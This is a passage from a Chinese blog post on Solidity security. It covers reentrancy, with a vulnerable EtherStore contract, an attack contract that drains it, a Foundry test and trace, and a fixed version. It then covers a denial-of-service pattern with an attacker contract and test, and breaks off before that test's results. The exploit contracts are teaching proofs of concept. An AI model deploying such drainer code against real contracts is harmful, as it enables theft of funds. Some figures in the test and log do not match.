@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxx-xx"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'UA-xxxxxx-xx');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="It&#39;s an web3 blog..."/>
+  <meta name="keyword" content="web3,blockchain,smart contract,solidity"/>
+  <link rel="shortcut icon" href="/img/avatar/roguerabbit.jpg"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+
+    
+      <!-- gitalk start -->
+      <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"> -->
+      <link rel="stylesheet" href="/css/gitalk.css"/>
+      <!-- gitalk end -->
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="http://yoursite-url/en/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns_zh-cn/">
+  <title>
+    
+      Solidity 安全：已知攻击方法和常见防御模式综合列表 - Live My Life
+    
+  </title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--light">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'light';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Live My Life</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">HOME</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              ABOUT
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              CATEGORIES
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              ARCHIVES
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              TAGS
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>SEARCH</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('/img/header_img/newhome_bg.jpg');
+      --intro-header-background-image-url-post: url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: url('//img/header_img/lml_bg.jpg');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/newhome_bg.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/lml_bg.jpg');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('/img/header_img/lml_bg.jpg'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('/img/signature/vincent-white.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#Solidity 安全" title="Solidity 安全">Solidity 安全</a>
+              
+            </div>
+            <h1>Solidity 安全：已知攻击方法和常见防御模式综合列表</h1>
+            <h2 class="subheading">Solidity 安全：已知攻击方法和常见防御模式综合列表</h2>
+            <span class="meta">
+              Posted by Mr. Alex on
+              2024-05-11
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">11</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">2.5k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h1 id="Solidity-安全：已知攻击方法和常见防御模式综合列表"><a href="#Solidity-安全：已知攻击方法和常见防御模式综合列表" class="headerlink" title="Solidity 安全：已知攻击方法和常见防御模式综合列表"></a>Solidity 安全：已知攻击方法和常见防御模式综合列表</h1><h2 id="重入漏洞"><a href="#重入漏洞" class="headerlink" title="重入漏洞"></a>重入漏洞</h2><p>以太坊智能合约的特点之一是能够调用和利用其他外部合约的代码，合约通常也处理Ether，因此通常会将Ether发送给各种外部用户地址，调用外部合约或将以太坊发送到地址的操作需要合约提交外部调用，这些外部调用可能被攻击者劫持，迫使合约执行进一步的代码（即通过回退函数），包括回调自身，因此代码执行“重新进入”合约，这种攻击被用于臭名昭著的DAO攻击。</p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>当合约将Ether发送到未知地址时，可能会发生次攻击，攻击者可以在receive函数中的外部地址构建一个恶意代码的合约，因此，当合约向此地址发送Ether时，它将调用恶意代码，通常，恶意代码会在易受攻击的合约上执行一个函数，该函数会运行一项开发人员不希望的操作。“重入”这个名称来源于外部恶意合约调用了易受攻击合约的功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>contract EtherStore&#123;<br><br>    mapping(address =&gt; uint256) public balances;<br><br>    function depositFunds() public payable&#123;<br>        balances[msg.sender] += msg.value;<br>    &#125;<br><br><br>    function withdrawFunds() public&#123;<br>        uint256 _weiToWithdraw = balances[msg.sender];<br>        require(_weiToWithdraw &gt;= 0);<br>        (bool sent, ) = payable(msg.sender).call&#123;value: _weiToWithdraw&#125;(&quot;&quot;);<br>        require(sent, &quot;Failed to send Ether&quot;);<br>        balances[msg.sender] = 0;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>该合约有两个方法，<code>depositFunds()</code> 和 <code>withdrawFunds()</code> ,<code>depositFunds()</code> 增加存款金额，<code>withdrawFunds</code> 默认用户一次性提取自己所有的存款。</p>
+<p>漏洞发生在 <code>(bool sent, ) = msg.sender.call&#123;value: _weiToWithdraw&#125;(&quot;&quot;);</code> </p>
+<p>攻击合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &#123;EtherStore&#125; from &quot;./EtherStore.sol&quot;;<br>contract Attack &#123;<br>    EtherStore public etherStore;<br>    uint256 public attackAmount;<br><br>    constructor(address _etherStoreAddress) &#123;<br>        etherStore = EtherStore(_etherStoreAddress);<br>    &#125;<br><br>    function attackDeposit() public payable &#123;<br>        etherStore.depositFunds&#123;value: msg.value&#125;();<br>        attackAmount = msg.value;<br>        etherStore.withdrawFunds();<br>    &#125;<br><br>    receive() external payable &#123;<br>        if (address(etherStore).balance &gt;= attackAmount) &#123;<br>            etherStore.withdrawFunds();<br>        &#125;<br>    &#125;<br><br>    function getBalance() public view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Test 模拟模拟攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test_Attack() public &#123;<br>        deal(attacker, 100 ether);<br>        vm.startPrank(attacker);<br>        //用户存款<br>        etherStore.depositFunds&#123;value: 15 ether&#125;();<br>        console.log(&quot;after deposit:&quot;,address(etherStore).balance);<br>        // 攻击合约<br>        attack.attackDeposit&#123;value: 1 ether&#125;();<br>        console.log(&quot;after attack:&quot;,address(etherStore).balance);<br>        vm.stopPrank();<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>攻击日志</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs tex">Ran 1 test for test/ReentrancyAttackTest/ReentrancyAttackTest.t.sol:ReentrancyAttackTest<br>[PASS] test<span class="hljs-built_in">_</span>Attack() (gas: 139843)<br>Logs:<br>  after deposit: 5000000000000000000<br>  after attack: 0<br><br>Traces:<br>  [139843] ReentrancyAttackTest::test<span class="hljs-built_in">_</span>Attack()<br>    ├─ [0] VM::deal(0x000000000000000000000000000000000000007B, 100000000000000000000 [1e20])<br>    │   └─ ← [Return] <br>    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)<br>    │   └─ ← [Return] <br>    ├─ [22415] EtherStore::depositFunds&#123;value: 5000000000000000000&#125;()<br>    │   └─ ← [Stop] <br>    ├─ [0] console::log(&quot;after deposit:&quot;, 5000000000000000000 [5e18]) [staticcall]<br>    │   └─ ← [Stop] <br>    ├─ [103388] Attack::attackDeposit&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22415] EtherStore::depositFunds&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop] <br>    │   ├─ [49076] EtherStore::withdrawFunds()<br>    │   │   ├─ [41686] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   ├─ [40818] EtherStore::withdrawFunds()<br>    │   │   │   │   ├─ [33428] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   ├─ [32560] EtherStore::withdrawFunds()<br>    │   │   │   │   │   │   ├─ [25170] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   ├─ [24302] EtherStore::withdrawFunds()<br>    │   │   │   │   │   │   │   │   ├─ [16912] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   ├─ [16044] EtherStore::withdrawFunds()<br>    │   │   │   │   │   │   │   │   │   │   ├─ [8654] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   │   │   ├─ [7786] EtherStore::withdrawFunds()<br>    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [396] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   │   └─ ← [Stop] <br>    │   │   │   │   └─ ← [Stop] <br>    │   │   │   └─ ← [Stop] <br>    │   │   └─ ← [Stop] <br>    │   └─ ← [Stop] <br>    ├─ [0] console::log(&quot;after attack:&quot;, 0) [staticcall]<br>    │   └─ ← [Stop] <br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return] <br>    └─ ← [Stop] <br><br>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 642.63µs (218.54µs CPU time)<br></code></pre></td></tr></table></figure>
+<p>攻击合约利用自身的receive函数来不断的提取Ether，因为执行转账前它的存款数据并未改变，所以<code>require(_weiToWithdraw &gt;= 0);</code> 一直成立，就会不断的执行次方法，直到取款达到黑客的攻击目标。</p>
+<h3 id="预防技术"><a href="#预防技术" class="headerlink" title="预防技术"></a>预防技术</h3><p>有许多常用的技术可以避免智能合约潜在的重入漏洞</p>
+<p>1: 使用transfer方法，转账功能只能发送<code>2300 gas</code> 不足以使目的地址/调用另一份合约（重入攻击合约）</p>
+<p>2:在转账前更改用户存款余额，即<code>balances[msg.sender] = 0;</code> 放在<code>(bool sent, ) = payable(msg.sender).call&#123;value: _weiToWithdraw&#125;(&quot;&quot;);</code> 之前。</p>
+<p>3:重入锁，也就是说，添加一个代码执行过程中锁定合约的状态变量，阻止重入调用。</p>
+<h3 id="修复合约"><a href="#修复合约" class="headerlink" title="修复合约"></a>修复合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract EtherStore&#123;<br><br>    mapping(address =&gt; uint256) public balances;<br><br>    bool reEntrancyAttack = false;<br><br>    function depositFunds() public payable&#123;<br>        balances[msg.sender] += msg.value;<br>    &#125;<br>		<br>		// 重入锁<br>    modifier noReEntrancy()&#123;<br>        require(!reEntrancyAttack, &quot;ReEntrancy Attack Detected&quot;);<br>        reEntrancyAttack = true;<br>        _;<br>        reEntrancyAttack = false;<br>    &#125;<br><br>    function withdrawFunds() public noReEntrancy&#123;<br>        uint256 _weiToWithdraw = balances[msg.sender];<br>        //转账前修改用户余额<br>        balances[msg.sender] = 0;<br>        //使用transfer 限制2300 gas<br>        payable(msg.sender).transfer(_weiToWithdraw);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="拒绝服务（DOS）"><a href="#拒绝服务（DOS）" class="headerlink" title="拒绝服务（DOS）"></a>拒绝服务（DOS）</h2><p>这个类别非常广泛，但其基本攻击形式都是让用户短暂的在某些情形下永久退出不可操作的合约，这种攻击可以吧Ether永远锁在被攻击的合约中。</p>
+<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>有很多办法可以让合约变得不可操作，这里我只强调一些微妙的区块链Solidity编码形式，虽然看不太出来，但可能留下让攻击者执行DOS攻击的空间。</p>
+<p>1:通过外部操纵映射或数组循环，通常情况下，出现在<code>owner</code>希望在其投资者之间分配代币的情况下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DistributeTokens &#123;<br>    address public owner; // gets set somewhere<br>    address[] investors; // array of investors<br>    uint[] investorTokens; // the amount of tokens each investor gets<br><br><br>    function invest() public payable &#123;<br>        investors.push(msg.sender);<br>        investorTokens.push(msg.value); // 5 times the wei sent<br>    &#125;<br><br>    function distribute() public &#123;<br>        require(msg.sender == owner); // only owner<br>        for (uint i = 0; i &lt; investors.length; i++) &#123;<br>            // here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;<br>            payable(investors[i]).transfer(investorTokens[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>攻击者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DOSAttacker &#123;<br><br>    address public impl;<br><br>    constructor(address _impl) &#123;<br>        impl = _impl;<br>    &#125;<br>    function invest() public payable &#123;<br>         (bool success,) = impl.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;invest()&quot;));<br>         require(success, &quot;Invest failed&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Test 模拟攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.13;<br><br>import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;<br><br>import &#123;Distribute&#125; from &quot;../../src/DOSAttack/Distribute.sol&quot;;<br>import &#123;DOSAttacker&#125; from &quot;../../src/DOSAttack/DOSAttacker.sol&quot;;<br><br>contract DOSAttackTest is Test&#123;<br>    Distribute public distribute;<br>    DOSAttacker public attacker;<br><br>    function setUp() public &#123;<br>        distribute = new Distribute();<br>        attacker = new DOSAttacker(address(distribute));<br><br>    &#125;<br><br>    function testDOSAttack() public &#123;<br>        <br>        address alex = address(0x1);<br>        address bob = address(0x2);<br>        deal(alex, 1 ether);<br>        deal(bob, 1 ether);<br>        // 普通用户1投资<br>        vm.startPrank(alex);<br>        distribute.invest&#123;value: 0.01 ether&#125;();<br>        vm.stopPrank();<br>        //攻击者投资<br>        attacker.invest&#123;value: 0.1 ether&#125;();<br><br>        // 普通用户2投资<br>        vm.startPrank(alex);<br>        distribute.invest&#123;value: 0.01 ether&#125;();<br>        vm.stopPrank();<br><br>        //平台分配投资<br>        distribute.distribute();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>测试结果</p>
